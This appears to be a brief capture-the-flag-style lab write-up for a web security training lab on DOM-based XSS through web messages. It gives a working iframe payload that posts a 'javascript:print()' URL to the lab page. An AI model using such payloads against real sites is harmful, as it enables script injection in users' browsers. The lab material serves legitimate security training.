Lab #2 – DOM XSS using web messages and a JavaScript URL

Target Goal - Exploit DOM based XSS vulnerability to call the print function.

Analysis:


<iframe src="https://0a540060031e973e80f3264d00fc00b8.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:', '*')">
